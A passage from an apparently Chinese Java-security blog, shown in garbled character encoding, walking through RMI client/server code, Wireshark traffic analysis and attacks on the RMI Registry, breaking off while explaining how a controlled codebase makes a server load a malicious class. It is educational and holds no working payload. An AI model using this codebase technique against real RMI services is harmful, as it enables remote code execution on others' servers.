<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230913103004923.png" alt="image-20230913103004923"></p>
<p>æœ€ååœ¨IDEAä¸­å°†åŒ…åŠ åˆ°é¡¹ç›®ç»“æ„é‡Œå³å¯ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230917111005900.png" alt="image-20230917111005900"></p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230917110908280.png" alt="image-20230917110908280"></p>
<h2 id="RMIæµé‡åˆ†æ"><a href="#RMIæµé‡åˆ†æ" class="headerlink" title="RMIæµé‡åˆ†æ"></a>RMIæµé‡åˆ†æ</h2><p>ç”¨<code>wireshark</code>æŠ“åŒ…çœ‹çœ‹RMIçš„é€šè®¯æ•°æ®åŸç†</p>
<p>ä¸ºäº†æ–¹ä¾¿ç›´è§‚çœ‹å‡ºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ï¼Œäºæ˜¯ç”¨è™šæ‹Ÿæœºè·‘æœåŠ¡ç«¯ï¼Œä¸»æœºè·‘å®¢æˆ·ç«¯ï¼Œè¿™é‡Œå°±ä¸ä¼šä¸¤ä¸ªipéƒ½æ˜¯ä¸€æ ·çš„äº†</p>
<blockquote>
<p>æœåŠ¡ç«¯ipï¼š<code>192.168.169.131</code></p>
<p>å®¢æˆ·ç«¯ipï¼š<code>192.168.126.1</code>(å®é™…ipä¸º<code> 10.19.16.44</code>ï¼Œä½†æ˜¯ç”±äºä¸»æœºæ˜¯é€šè¿‡è™šæ‹Ÿæœºç½‘å¡è®¿é—®çš„æ‰€ä»¥ï¼ŒæŠ“è™šæ‹Ÿæœºç½‘å¡çš„æµé‡åŒ…æ—¶ï¼Œç½‘å¡ipå°±æ˜¯ä¸»æœºçš„)</p>
</blockquote>
<p>è¿™é‡Œå°†<code>IRemoteHelloWorld</code>ç‹¬ç«‹ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ä»£ç æœ‰ç‚¹ä¸ä¸€æ ·ï¼ŒæœåŠ¡ç«¯åˆ ä¸åˆ <code>IRemoteHelloWorld</code>éƒ½ä¸€æ ·</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_1;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (IRemoteHelloWorld)</span><br><span class="line">                  Naming.lookup(<span class="string">&quot;rmi://192.168.169.131:1099/Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello(<span class="string">&quot;Ttoc&quot;</span>);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230913132813979.png" alt="image-20230913132813979"></p>
<p>æŠ“ä¸ªæµé‡åŒ…çœ‹çœ‹ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230914162413296.png" alt="image-20230914162413296"></p>
<p>å¯ä»¥çœ‹åˆ°æ•´ä½“çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä¸¤æ¬¡tcpæ¡æ‰‹[ç°è‰²éƒ¨åˆ†]ï¼Œä¹Ÿå°±æ˜¯åœ¨å®é™…æƒ…å†µä¸‹æ„æˆäº†ä¸¤æ¬¡tcpè¿æ¥ã€‚</p>
<p>ç¬¬ä¸€æ¬¡æ˜¯ä»å®¢æˆ·ç«¯çš„<code>19581</code>ç«¯å£è®¿é—®æœåŠ¡å™¨çš„<code>1099</code>ç«¯å£ï¼Œç¬¬äºŒæ¬¡æ˜¯å®¢æˆ·ç«¯çš„<code>19584</code>ç«¯å£è®¿é—®<code>55947</code>ç«¯å£</p>
<p>å…¶å®ç¬¬ä¸€æ¬¡æ¡æ‰‹å¾ˆå®¹æ˜“ç†è§£ï¼Œå› ä¸ºæˆ‘ä»¬çš„å®¢æˆ·ç«¯è®¾ç½®çš„å°±æ˜¯è®¿é—®æœåŠ¡ç«¯çš„1099ç«¯å£ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆåé¢ä¼šè«åå…¶å¦™è®¿é—®æœåŠ¡ç«¯çš„55947ç«¯å£å‘¢</p>
<p>åœ¨æµé‡åŒ…çš„<code>JRMI Return Data</code>ä¸­ï¼Œä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€çš„æµé‡ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æœ€åçš„æœåŠ¡ç«¯ipåé¢çš„ä¸€ä¸ªå­—èŠ‚<code>\x00\x00\xda\x8b</code></p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230914163214005.png" alt="image-20230914163214005"></p>
<p>é€šè¿‡è¿›åˆ¶è½¬åŒ–å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªå­—èŠ‚æ­£å¥½æ˜¯<code>55947</code>çš„å¯¹åº”çš„ç½‘ç»œåºåˆ—ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆå®¢æˆ·ç«¯ä¼šå‘æœåŠ¡å™¨ç«¯çš„<code>55947</code>ç«¯å£è¿›è¡Œtcpæ¡æ‰‹ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230914163037413.png" alt="image-20230914163037413"></p>
<p>ä½†å…¶å®è¿™æ®µæ•°æ®ä¸­ï¼Œä»<code>\xAC\xED</code>å¼€å§‹åï¼Œåé¢çš„æ‰€æœ‰æ•°æ®éƒ½å±äºJavaåºåˆ—åŒ–çš„å†…å®¹ï¼Œå…¶ä¸­çš„ipå’Œç«¯å£åªæ˜¯è¿™ä¸ªå¯¹è±¡çš„ä¸€éƒ¨åˆ†ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230914164341663.png" alt="image-20230914164341663"></p>
<p>å…¶å®å¯ä»¥ç®€å•æ€»ç»“ä¸€ä¸‹RMIçš„æµç¨‹ï¼Œ</p>
<p>é¦–å…ˆå®¢æˆ·ç«¯è®¿é—®è¿æ¥<code>Registry</code>ï¼Œå¹¶åœ¨å…¶ä¸­å¯»æ‰¾Nameåä¸ºHelloçš„å¯¹è±¡ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯¹åº”æ•°æ®åŒ…ä¸­çš„<code>JRMI,Call</code>ã€‚</p>
<p>è€Œå<code>Registry</code>å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸²ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä»£è¡¨æ‰¾åˆ°äº†<code>Name=Hello</code>çš„å¯¹è±¡ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯¹åº”æ•°æ®åŒ…ä¸­çš„<code>JRMI,ReturnData</code>ã€‚</p>
<p>å®¢æˆ·ç«¯ååºåˆ—åŒ–<code>JRMI,ReturnData</code>ï¼Œå‘ç°è¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ï¼Œåœ°å€æ˜¯<code>192.168.169.131:55947</code>ï¼Œäºæ˜¯å†ä¸è¿™ä¸ªåœ°å€å»ºç«‹TCPè¿æ¥ï¼Œåœ¨è¿™ä¸ªæ–°çš„è¿æ¥ä¸­ï¼Œæ‰å¯ä»¥æ‰§è¡ŒçœŸæ­£è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯<code>hello()</code>ã€‚</p>
<p>å¯ä»¥ä»ä¸‹å›¾ç›´è§‚çš„è®¤è¯†åˆ°<code>RMI</code>ä¸­å„ä¸ªå…ƒç´ çš„å…³ç³»ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230917102629249.png" alt="image-20230917102629249"></p>
<p>ï¼ˆåº•ä¸‹æ˜¯<code>RMI</code>ï¼Œå•è¯å†™é”™äº†åº”è¯¥æ˜¯<code>invocation</code>)</p>
<p>å¯ä»¥ä»å…ˆä»<code>RMI Server</code>å¼€å§‹çœ‹ï¼ŒæœåŠ¡ç«¯å…ˆåˆ°<code>RMI Registry</code>ä¸Šæ³¨å†Œäº†ä¸€ä¸ªNameçš„å¯¹è±¡ç»‘å®šå…³ç³»ï¼›ã€å¦‚ä¸‹ä»£ç ï¼Œå°†<code>RemoteHelloWorld</code>ç±»å®ä¾‹åŒ–ï¼Œç„¶åå°†å…¶ç»‘å®šåˆ°Helloè¿™ä¸ªNameä¸Šï¼Œè¿™å°±æ˜¯ç»‘å®šï¼Œç„¶åå‘Šè¯‰<code>Registry</code>ï¼Œè¿™ä¸ªå¯¹è±¡èƒ½é€šè¿‡è®¿é—®ç»™å®šçš„åç§°è¿›è¡Œè®¿é—®ã€‘</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>

<p><code>RMI Registry</code>ç›¸å½“äºä¸€ä¸ªç½‘å…³ï¼Œå®ƒæœ¬èº«è™½ç„¶ç»‘å®šäº†è¿œç¨‹éœ€è¦è°ƒç”¨çš„å¯¹è±¡ï¼Œä½†æ˜¯å®ƒè‡ªå·±æ˜¯ä¸ä¼šæ‰§è¡Œè¿œç¨‹æ–¹æ³•çš„ã€‚</p>
<p>è€Œåæ˜¯<code>RMI Client</code>ï¼Œå½“å®ƒçŸ¥é“<code>Name</code>åï¼Œä¼šå‘<code>RMI Registry</code>å‘é€æŸ¥è¯¢è¯·æ±‚ã€å¦‚ä¸‹ä»£ç ï¼Œå®¢æˆ·ç«¯è¿™é‡Œç”¨æœåŠ¡å™¨ç»™çš„å¯¹åº”çš„è°ƒç”¨çš„æ¥å£<code>IRemoteHelloWorld</code>ï¼Œåˆ›å»ºå¯¹è±¡<code>hello</code>ï¼Œç„¶åå‘<code>RMI Registry</code>å‘é€æƒ³è¦è°ƒç”¨çš„æ³¨å†Œåå­—ï¼Œ<code>RMI Registry</code>ä½¿ç”¨è¿™ä¸ªä¿¡æ¯æ¥æŸ¥æ‰¾å¹¶è¿”å›ç›¸åº”çš„è¿œç¨‹å¯¹è±¡å¼•ç”¨ã€‘</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (IRemoteHelloWorld) Naming.lookup(<span class="string">&quot;rmi://192.168.169.131:1099/Hello&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¿œç¨‹æ–¹æ³•çš„ç»‘å®šå…³ç³»ï¼Œç„¶åé€šè¿‡è¿™ä¸ªç»‘å®šå…³ç³»å†æ¬¡è¿æ¥RMI Serverï¼›</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello(<span class="string">&quot;Ttoc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>hello</code>å°±æ˜¯è·å¾—äº†<code>RemoteHelloWorld</code>ç±»çš„è¿œç¨‹å¯¹è±¡å¼•ç”¨ï¼Œç„¶åç”¨<code>hello.hello(&quot;Ttoc&quot;)</code>è¿›è¡Œè°ƒç”¨è¿™ä¸ªç±»ä¸­çš„<code>hello</code>æ–¹æ³•ã€‚è€Œè¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨ä¼šé€šè¿‡ç½‘ç»œå‘é€åˆ°æœåŠ¡å™¨ç«¯ï¼ŒæœåŠ¡å™¨ç«¯ä¼šæ‰§è¡Œå¯¹åº”æ–¹æ³•ï¼Œå¹¶å°†ç»“æœè¿”å›å®¢æˆ·ç«¯ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­RMIæ¡†æ¶èµ·åˆ°çš„ä½œç”¨å°±æ˜¯<code>å¤„ç†ç½‘ç»œé€šä¿¡ï¼Œåºåˆ—åŒ–ï¼Œååºåˆ—åŒ–</code>ç­‰ç»†èŠ‚ï¼Œä½¿å¾—å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡å°±åƒæ˜¯åœ¨æœ¬åœ°æ–¹æ³•æ‰§è¡Œä¸€æ ·ï¼Œä½†æ˜¯æœ¬è´¨è¿˜æ˜¯åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œçš„æ‰§è¡Œã€‚</p>
]]></content>
      <categories>
        <category>Javaæ¼«è°ˆå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaå®‰å…¨[RMI(2)]</title>
    <url>//post/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/</url>
    <content><![CDATA[<p>ä»RMIç¬¬ä¸€ç¯‡æè¿°äº†RMIçš„é€šä¿¡è¿‡ç¨‹å’Œç»„æˆæˆåˆ†ï¼Œæ€»ç»“ä¸€ä¸‹ï¼Œä¸€ä¸ªRMIè¿‡ç¨‹æœ‰ä»¥ä¸‹ä¸‰ä¸ªå‚ä¸è€…ï¼š</p>
<blockquote>
<ul>
<li><code>RMI Registry</code></li>
<li><code>RMI Server</code></li>
<li><code>RMI Client</code></li>
</ul>
</blockquote>
<p>ä½†æ˜¯å¯¹äºRMI Registryæ¥è¯´ï¼Œä¸€èˆ¬åœ¨åˆ›å»ºæ—¶ï¼Œå°±ç›´æ¥å’ŒæœåŠ¡å™¨ç«¯çš„ä¸€ä¸ªå¯¹è±¡è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥æœ€ååªæœ‰Serverå’ŒClientä¸¤éƒ¨åˆ†ä»£ç ï¼Œè€ŒServerä¸­å°±è‡ªç„¶åŒ…å«äº†Registryå’ŒServerä¸¤éƒ¨åˆ†ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°ä»£ç ä¸­ï¼Œç¬¬ä¸€è¡Œæ˜¯åˆ›å»ºå¹¶è¿è¡Œ<code>RMI Registry</code>ï¼Œç¬¬äºŒè¡Œæ˜¯å°†<code>RemoteHelloWorld</code>å¯¹è±¡ç»‘å®šåˆ°<code>Hello</code>è¿™ä¸ª<code>Name</code>ä¸Šã€‚</p>
<p><code>Naming.bind</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>url</code>ï¼Œæ ¼å¼ä¸º<code>rmi://host:post/name</code>ã€‚è¿™é‡Œçš„<code>host</code>å’Œ<code>post</code>å°±æ˜¯<code>RMI Registry</code>çš„åœ°å€å’Œç«¯å£ï¼Œ<code>name</code>å°±æ˜¯è¿œç¨‹å¯¹è±¡ç»‘å®šçš„åå­—ã€‚</p>
<p>ä¸è¿‡ï¼Œå¦‚æœ<code>RMI Registry</code>åœ¨æœ¬åœ°è¿è¡Œï¼Œé‚£ä¹ˆ<code>host</code>å’Œ<code>port</code>æ˜¯<u>å¯ä»¥çœç•¥</u>çš„ï¼Œ<code>host</code>é»˜è®¤ä¸º<code>localhost</code>ï¼Œ<code>port</code>é»˜è®¤æ˜¯<code>1099</code></p>
<p>ç›´æ¥ä¿ç•™<code>name</code>å°±è¡Œï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;Hello&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ç¯‡å¤§è‡´è®²äº†RMIæ•´ä½“çš„åŸç†å’Œæµç¨‹ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è‡ªç„¶è¦æƒ³åˆ°RMIä¼šæœ‰å“ªäº›å®‰å…¨é—®é¢˜ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤ä¸ªæ–¹å‘</p>
<blockquote>
<ul>
<li>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè®¿é—®<code>RMI Registry</code>ï¼Œå°†å¦‚ä½•å¯¹å…¶è¿›è¡Œæ”»å‡»ï¼Ÿ</li>
<li>å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›®æ ‡RMIå®¢æˆ·ç«¯ä¸­çš„<code>Naming.lookup</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯<code>RMI Registry</code>çš„åœ°å€å’Œç«¯å£ï¼Œèƒ½ä¸èƒ½è¿›è¡Œæ”»å‡»ï¼Ÿ</li>
</ul>
</blockquote>
<span id="more"></span>

<h1 id="Javaå®‰å…¨-RMI-2"><a href="#Javaå®‰å…¨-RMI-2" class="headerlink" title="Javaå®‰å…¨[RMI(2)]"></a>Javaå®‰å…¨[RMI(2)]</h1><blockquote>
<p>å¤ç°æ–‡ç« è¿‡ç¨‹ä¸­é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œæœ¬æ–‡ä¸å…¨å±•ç¤ºï¼Œè¯·è‡ªè¡Œç†è§£å’Œæœç´¢ï¼ŒåŠ¨æ‰‹æ“ä½œå­¦åˆ°æ›´å¤š</p>
</blockquote>
<h2 id="å¦‚ä½•æ”»å‡»RMI-Registry"><a href="#å¦‚ä½•æ”»å‡»RMI-Registry" class="headerlink" title="å¦‚ä½•æ”»å‡»RMI Registry?"></a>å¦‚ä½•æ”»å‡»RMI Registry?</h2><p>ä»ç¬¬ä¸€ç¯‡RMIæ–‡ç« ä¸­æåˆ°ï¼ŒæœåŠ¡å™¨ç«¯ç”¨<code>Naming.rebind</code>ç»‘å®šå¯¹è±¡ã€‚æ¯”å¦‚ä¸‹é¢ä»£ç å°±å°†<code>RemoteHelloWorld</code>ç±»å®ä¾‹ç»‘å®šåœ¨<code>Registry</code>ä¸­çš„<code>Hello</code>åä¸Šï¼Œ<code>192.168.135.142:1099</code>æ˜¯<code>RMI Registry</code>çš„åœ°å€å’Œç«¯å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://192.168.169.131:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åŒæ—¶ä¹ŸçŸ¥é“åœ¨å®¢æˆ·ç«¯ä¹Ÿå¯ä»¥è°ƒç”¨<code>Naming</code>ï¼Œå¹¶ä¸”å¯ä»¥åœ¨<code>RMI Registry</code>ä¸­è¿›è¡Œ<code>lookup</code>æŸ¥æ‰¾ï¼Œå¦‚æœå®¢æˆ·ç«¯ä¹Ÿè¿›è¡Œ<code>rebind</code>ï¼Œå¯ä¸å¯ä»¥å°†<code>Hello</code>å¯¹åº”çš„å¯¹è±¡ä¿®æ”¹è¦†ç›–æ‰å‘¢ï¼Ÿ</p>
<p>å¯ä»¥å…ˆåœ¨æœ¬æœºä¸Šå¯åŠ¨ä¸€ä¸ªç±»ä¼¼çš„<code>server</code>ç»‘å®šè™šæ‹Ÿæœºé‡Œçš„<code>Registry</code>ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170229091.png" alt="image-20230924170229091"></p>
<p>ä½†æ˜¯å‘ç”ŸæŠ¥é”™ï¼Œæç¤ºå½“å‰å¹¶é<code>localhost</code></p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170622609.png" alt="image-20230924170622609"></p>
<blockquote>
<p>è¿™ä¹Ÿæ˜¯å› ä¸ºJavaå¯¹è¿œç¨‹è®¿é—®<code>RMI Registry</code>åšäº†é™åˆ¶ï¼Œåªæœ‰å½“è¯·æ±‚è®¿é—®çš„<code>æºåœ°å€æ˜¯localhost</code>æ—¶å€™ï¼Œæ‰å¯ä»¥è¿›è¡Œè°ƒç”¨<code>rebind,bind,unbind</code>ç­‰æ–¹æ³•ã€‚</p>
</blockquote>
<blockquote>
<p>ä¸è¿‡å¦‚æœè‡³å°‘å•çº¯åˆ—å‡ºç»‘å®šå¯¹è±¡æˆ–è€…æŸ¥æ‰¾ç»‘å®šå¯¹è±¡ï¼Œæ˜¯æ²¡æœ‰è¿™ä¸ªé™åˆ¶çš„ï¼Œå¦‚<code>list</code>å’Œ<code>lookup</code>æ–¹æ³•æ˜¯å¯ä»¥è¿œç¨‹è°ƒç”¨çš„ã€‚</p>
</blockquote>
<p>ä¸ºäº†æ›´åŠ ç›´è§‚ï¼Œç°åœ¨è™šæ‹Ÿæœºçš„æœåŠ¡å™¨ç«¯ï¼Œç»‘å®šäº†ä¸‰ä¸ªName</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924172154462.png" alt="image-20230924172154462"></p>
<p>å®¢æˆ·ç«¯ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Client_list</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] s = Naming.list(<span class="string">&quot;rmi://192.168.169.131:1099&quot;</span>);</span><br><span class="line">        System.out.println(Arrays.toString(s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924172636783.png" alt="image-20230924172636783"></p>
<blockquote>
<p>lookupä½œç”¨å°±æ˜¯è·å¾—æŸä¸ªè¿œç¨‹å¯¹è±¡ã€‚é‚£ä¹ˆï¼Œåªè¦ç›®æ ‡æœåŠ¡å™¨ä¸Šå­˜åœ¨ä¸€äº›å±é™©æ–¹æ³•ï¼Œæˆ‘ä»¬é€šè¿‡RMIå°±å¯ä»¥å¯¹å…¶è¿›è¡Œè°ƒç”¨ï¼Œä¹‹å‰æ›¾ç»æœ‰ä¸€ä¸ªå·¥å…· <a href="https://github.com/NickstaDB/BaRMIe%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B8%80%E4%B8%AA%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E8%BF%9B%E8%A1%8C%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A2%E6%B5%8B%E3%80%82">https://github.com/NickstaDB/BaRMIeï¼Œå…¶ä¸­ä¸€ä¸ªåŠŸèƒ½å°±æ˜¯è¿›è¡Œå±é™©æ–¹æ³•çš„æ¢æµ‹ã€‚</a> ä½†æ˜¯æ˜¾ç„¶ï¼ŒRMIçš„æ”»å‡»é¢ç»ä¸ä»…ä»…æ˜¯è¿™æ ·æ²¡è¥å…»ã€‚</p>
</blockquote>
<h2 id="RMIåˆ©ç”¨codebaseæ‰§è¡Œä»»æ„ä»£ç "><a href="#RMIåˆ©ç”¨codebaseæ‰§è¡Œä»»æ„ä»£ç " class="headerlink" title="RMIåˆ©ç”¨codebaseæ‰§è¡Œä»»æ„ä»£ç "></a>RMIåˆ©ç”¨<code>codebase</code>æ‰§è¡Œä»»æ„ä»£ç </h2><p>å¤§éƒ¨åˆ†çš„Javaçš„æ¼æ´éƒ½æ˜¯è¿œç¨‹è¿›è¡Œåˆ©ç”¨æ¶æ„ç±»ï¼Œä½†æ˜¯åœ¨æ€ä¹ˆè®©ç›®æ ‡æœåŠ¡å™¨èƒ½å¤Ÿä¸‹è½½å¹¶åŠ è½½è‡ªå·±çš„æ¶æ„æœåŠ¡å™¨ä¸Šçš„æ¶æ„ç±»ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°äº†<code>codebase</code>ã€‚</p>
<p>æ›¾ç»æµè§ˆå™¨å¯ä»¥ç›´æ¥è¿è¡Œ<code>java</code>ï¼Œå°±æ˜¯é€šè¿‡<code>Applet</code>æ ‡ç­¾ï¼Œä½†æ˜¯åœ¨<code>HTML5</code>ä¸­ä¸å†æ”¯æŒï¼Œå¹¶åœ¨<code>HTML 4.01</code> ä¸­ä¸èµæˆä½¿ç”¨ <code>&lt;applet&gt;</code> å…ƒç´ ã€‚</p>
<blockquote>
<p>Applet æ˜¯ä¸€ç§ Java ç¨‹åºã€‚å®ƒä¸€èˆ¬è¿è¡Œåœ¨æ”¯æŒ Java çš„ Web æµè§ˆå™¨å†…ã€‚å› ä¸ºå®ƒæœ‰å®Œæ•´çš„ Java APIæ”¯æŒ,æ‰€ä»¥Applet æ˜¯ä¸€ä¸ªå…¨åŠŸèƒ½çš„ Java åº”ç”¨ç¨‹åºã€‚</p>
<p><code>&lt;applet&gt; æ ‡ç­¾åœ¨ HTML 4 ä¸­ç”¨äºå®šä¹‰åµŒå…¥å¼å°ç¨‹åºï¼ˆæ’ä»¶ï¼‰ã€‚</code></p>
</blockquote>
<p>ä½¿ç”¨<code>Applet</code>çš„æ—¶å€™é€šå¸¸éœ€è¦æŒ‡å®šä¸€ä¸ª<code>codebase</code>å±æ€§ï¼Œå¦‚ä¸‹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">applet</span> <span class="attr">code</span>=<span class="string">&quot;HelloWorld.class&quot;</span> <span class="attr">codebase</span>=<span class="string">&quot;Applets&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">applet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨RMIä¸­è¿œç¨‹åŠ è½½æ—¶ä¹ŸåŒæ—¶æ¶‰åŠåˆ°äº†<code>codebase</code></p>
<blockquote>
<p><code>codebase</code>æ˜¯ä¸€ä¸ªåœ°å€ï¼Œ<u>å‘Šè¯‰Javaè™šæ‹Ÿæœºæˆ‘ä»¬åº”è¯¥ä»å“ªä¸ªåœ°æ–¹å»æœç´¢ç±»</u>ï¼Œæœ‰ç‚¹åƒæˆ‘ä»¬æ—¥å¸¸ç”¨çš„ <code>CLASSPATH</code>ï¼Œä½†<code>CLASSPATH</code>æ˜¯æœ¬åœ°è·¯å¾„ï¼Œè€Œ<code>codebase</code>é€šå¸¸æ˜¯è¿œç¨‹<code>URL</code>ï¼Œæ¯”å¦‚<code>http</code>ã€<code>ftp</code>ç­‰ã€‚</p>
</blockquote>
<p>å¦‚æœæŒ‡å®š<code>codebase=http://example.com/</code>ï¼Œç„¶ååŠ è½½<code>org.vulhub.example.Example</code> ç±»ï¼Œåˆ™javaè™šæ‹Ÿæœºå°±ä¼šä¸‹è½½<code>http://example.com/org/vulhub/example/Example.class</code>ï¼Œå¹¶ä½œä¸º<code>Example</code>ç±»çš„å­—èŠ‚ç ã€‚</p>
<p>åœ¨RMIä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´ä¼ é€’çš„æ˜¯ä¸€äº›åºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå°±ä¼šå»å¯»æ‰¾ç±»ã€‚<strong>å¦‚æœæŸä¸€ç«¯ååºåˆ—åŒ–æ—¶å‘ç°ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒä¼šå…ˆä»è‡ªå·±çš„<code>CLASSPATH</code>ä¸­è¿›è¡Œå¯»æ‰¾å¯¹åº”çš„ç±»ï¼Œå¦‚æœåœ¨æœ¬åœ°è¿˜æ˜¯æ‰¾ä¸åˆ°ï¼Œå°±ä¼šè¿œç¨‹å»åŠ è½½<code>codebase</code>ä¸­çš„ç±»ã€‚</strong></p>
<p>æ‰€ä»¥å¦‚æœ<code>codebase</code>è¢«æ§åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†™ä¸Šæˆ‘ä»¬æ¶æ„ç±»çš„<code>CLASSPATH</code>ï¼Œå½“æœåŠ¡ç«¯æœ¬åœ°åŠ è½½ä¸åˆ°çš„æ—¶å€™ï¼Œå°±ä¼šé€šè¿‡æˆ‘ä»¬æ§åˆ¶çš„<code>codebase</code>ä¸‹è½½æ¶æ„ç±»ï¼Œæœ€åè¾¾åˆ°åŠ è½½æ¶æ„ç±»çš„ç›®çš„ã€‚</p>
<blockquote>
